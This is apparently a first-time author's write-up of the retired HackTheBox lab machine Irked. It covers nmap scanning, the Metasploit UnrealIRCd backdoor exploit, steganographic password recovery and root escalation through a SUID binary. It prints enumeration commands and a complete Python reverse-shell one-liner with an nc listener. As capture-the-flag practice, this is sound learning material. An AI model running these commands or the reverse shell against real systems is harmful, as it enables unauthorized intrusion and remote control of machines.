

Hey people :D. Welcome to my write-up about Irked, a retired machine from HackTheBox, an **awesome** place to practice your skills on infosec.
It's my first ever write-up/post so feedback is more than welcome. Also, sorry about the inconsistent terminal color :sweaty-smile:

Enough talking, *let's heck'em* 

I started with what I think 90% of everyone out there starts, an nmap scan.

{starting nmap}

Visiting the website at http://10.10.10.117/ we get this content

{website}

From the beggining we get the first _clue_: **IRC**. But my first scan wasn't satisfying, so I looked a little deeper with ``nmap -p- 10.10.10.117``

{second nmap}

Aha! So there is an open irc port. The website was telling us that the irc was not working correctly, so if we connect to it, we might find something that we can take advantage of.

{setting up irc}

There I spent some time researching what a MOTD file is, but it didn't help me. So the next step for me is to search for a IRC exploit on Metasploit ~~(skid detected)~~ in a desperate hope for an exploit. 
After seeing the results and spending a minute or so, my brain finally started to kick: the specific IRC version (Unreal3.2.8.1) was vulnurable to backdoor command execution!

{msfconsole}

Well that was not that hard. After setting the RHOST ``set RHOST 10.10.10.117`` and RPORT ``set RPORT 6697``, I run the exploit and.. voilà! 

{run exploit}

Hacker's voice: *I'm in.*

After navigating through the system I found a user named "djmardov". In his Documents file there were 2 files: user.txt and .backup. Being only able to read the backup file, I came across this result:

{backup}

What I understood is that steg stands for *steganography*, i.e. the way of hiding data within other files. But there must exist an image for this, because most steg challenges that I've encountered hide data inside image files. And there was only one image available in the hole machine:

{stupid yellow face}

For steg challenges that requires extracting information from an image with a password, I either use steghide ``steghide --extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss`` or I often visit [this](https://futureboy.us/stegano/decinput.html) site. This time, to show something different than the classic steghide, I entered this image with the password on the website and I got the djmardov's password.

I logged in via ssh and user.txt was patiently waiting for me there :heart:

{user.txt, hide it a little??}
Now on to root!

My privilage escalation skills are not that great, so for a start I use some standard commands from the [0x00sec forum](https://0x00sec.org/t/enumeration-for-linux-privilege-escalation/1959). After running 
``find / -perm -g=s -o -perm -u=s -type f 2>/dev/null``
I came across some binaries that were executed as root. 

It took me quite some time to figure this out. An experienced hacker would easily recognize the binaries that stand out in a normal Linux machine.

After testing some binaries I came across the **/usr/bin/viewusers**. After putting it to the test I get this error. 

{first run, /tmp/listusers not found}

So this particular binary was searching for the /tmp/listusers file and was executing whatever command the file contained. So the solution is to create the /tmp/listusers file and write a command that the binary will execute as root, i.e. ``cat /root/root.txt``

After giving the permission to execute the file with ``chmod +x /usr/bin/viewusers`` I executed the binary and there's our flag :D

{root.txt}

But as @PresComm once said: "But if you don't get a shell and can't run code, is a system really owned? :thinking:"

Then, to get a shell, I typed ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``` into /tmp/listusers and execute **/usr/bin/viewusers** while waiting for a connection on my machine with ```nc -lvp 1337```. And Irked is officially pwned :D

{root shell}

I think Irked was an easy box (even for me). Nevertheless, it taught me to be patient and to read everything line by line. 
*Thankee*